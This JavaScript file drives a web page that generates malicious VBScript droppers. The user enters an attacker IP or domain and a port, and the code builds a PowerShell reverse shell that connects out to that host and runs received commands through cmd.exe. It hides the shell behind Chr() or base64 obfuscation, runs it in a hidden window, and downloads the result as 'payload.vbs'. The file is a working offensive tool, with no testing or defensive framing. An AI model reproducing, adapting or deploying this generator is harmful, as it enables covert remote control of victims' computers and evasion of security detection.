document.addEventListener('DOMContentLoaded', function() {
    // Elements
    const modal = document.getElementById('modal');
    const modalTitle = document.getElementById('modal-title');
    const modalMessage = document.getElementById('modal-message');
    const modalClose = document.querySelector('.modal-close');
    const modalOk = document.getElementById('modal-ok');
    const vbsFileInput = document.getElementById('vbs-file-input');
    const vbsBrowseBtn = document.getElementById('vbs-browse');
    const vbsFileName = document.getElementById('vbs-file-name');
    const ipInput = document.getElementById('ip');
    const portInput = document.getElementById('port');
    const filenameInput = document.getElementById('filename');
    const vbsOutput = document.getElementById('vbs-output');
    const generateChrBtn = document.getElementById('generate-chr');
    const generateB64Btn = document.getElementById('generate-b64');

    // Enhanced file input handling
    function initFileInput() {
        // Create a more reliable click handler
        const handleBrowseClick = () => {
            // Reset input value to ensure change event fires even for same file
            vbsFileInput.value = '';
            
            // For mobile devices, we need to trigger click in a specific way
            if ('ontouchstart' in window) {
                const event = new MouseEvent('click', {
                    view: window,
                    bubbles: true,
                    cancelable: true
                });
                vbsFileInput.dispatchEvent(event);
            } else {
                vbsFileInput.click();
            }
        };

        // Add multiple event types for maximum compatibility
        vbsBrowseBtn.addEventListener('click', handleBrowseClick);
        vbsBrowseBtn.addEventListener('touchend', function(e) {
            e.preventDefault();
            handleBrowseClick();
        });

        // More reliable file change handler
        vbsFileInput.addEventListener('change', function() {
            if (this.files && this.files.length > 0) {
                vbsFileName.textContent = this.files[0].name;
                
                // For mobile - sometimes need to re-trigger
                setTimeout(() => {
                    if (vbsFileName.textContent !== this.files[0].name) {
                        vbsFileName.textContent = this.files[0].name;
                    }
                }, 100);
            } else {
                vbsFileName.textContent = 'No file selected';
            }
        });

        // Fallback - if all else fails, show the file input directly
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            vbsFileInput.style.display = 'block';
            vbsFileInput.style.width = '100%';
            vbsFileInput.style.opacity = '1';
            vbsFileInput.style.position = 'static';
            vbsBrowseBtn.style.display = 'none';
        }
    }

    // Modal functions
    function showModal(title, message, isError = false) {
        modalTitle.textContent = title;
        modalMessage.textContent = message;
        modal.style.display = 'flex';
        modalTitle.style.color = isError ? 'var(--danger)' : 'var(--secondary)';
    }

    function closeModal() {
        modal.style.display = 'none';
    }

    // Validation functions
    function validateIpOrDomain(value) {
        const ipPattern = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        const domainPattern = /^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$/;
        const ngrokPattern = /^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[A-Za-z]{2,}$/;
        return ipPattern.test(value) || domainPattern.test(value) || ngrokPattern.test(value);
    }

    function validatePort(port) {
        return port > 0 && port <= 65535;
    }

    // Payload generation
    function powershellReverseShell(ip, port) {
        return (
            `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
            "$stream = $client.GetStream();" +
            "$writer = New-Object System.IO.StreamWriter($stream);" +
            "$buffer = New-Object System.Byte[] 1024;" +
            "$encoding = New-Object System.Text.ASCIIEncoding;" +
            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){" +
            "$command = $encoding.GetString($buffer, 0, $read);" +
            "$output = cmd.exe /c $command 2>&1 | Out-String;" +
            "$writer.WriteLine($output);" +
            "$writer.Flush()" +
            "}"
        );
    }

    function obfuscateChr(text) {
        return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
    }

    function downloadFile(content, filename) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename.endsWith('.vbs') ? filename : `${filename}.vbs`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // Generation functions
    function generateChrMethod() {
        const ip = ipInput.value.trim();
        const port = parseInt(portInput.value);
        const filename = filenameInput.value || 'payload.vbs';
        
        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
        
        try {
            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
            const payload = powershellReverseShell(ip, port);
            const obfPayload = obfuscateChr(payload);
            const vbsContent = (
                'Set x = CreateObject("WScript.Shell")\n' +
                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
            );
            
            vbsOutput.value = vbsContent;
            downloadFile(vbsContent, filename);
            showModal('Success', 'CHR method VBS generated and saved!');
        } catch (e) {
            showModal('Error', `Generation failed: ${e.message}`, true);
        }
    }

    function generateBase64Method() {
        const ip = ipInput.value.trim();
        const port = parseInt(portInput.value);
        const filename = filenameInput.value || 'payload.vbs';
        
        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
        
        try {
            const payload = powershellReverseShell(ip, port);
            const encoded = btoa(unescape(encodeURIComponent(payload)));
            const vbsContent = (
                'Set shell = CreateObject("Wscript.Shell")\n' +
                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
            );
            
            vbsOutput.value = vbsContent;
            downloadFile(vbsContent, filename);
            showModal('Success', 'Base64 method VBS generated and saved!');
        } catch (e) {
            showModal('Error', `Generation failed: ${e.message}`, true);
        }
    }

    // Initialize everything
    function init() {
        // Initialize file input
        initFileInput();
        
        // Modal events
        if (modalClose) modalClose.addEventListener('click', closeModal);
        if (modalOk) modalOk.addEventListener('click', closeModal);
        window.addEventListener('click', (e) => e.target === modal && closeModal());
        
        // Generation buttons
        if (generateChrBtn) {
            generateChrBtn.addEventListener('click', generateChrMethod);
            generateChrBtn.addEventListener('touchend', (e) => {
                e.preventDefault();
                generateChrMethod();
            });
        }
        
        if (generateB64Btn) {
            generateB64Btn.addEventListener('click', generateBase64Method);
            generateB64Btn.addEventListener('touchend', (e) => {
                e.preventDefault();
                generateBase64Method();
            });
        }
    }

    // Start the application
    init();
});
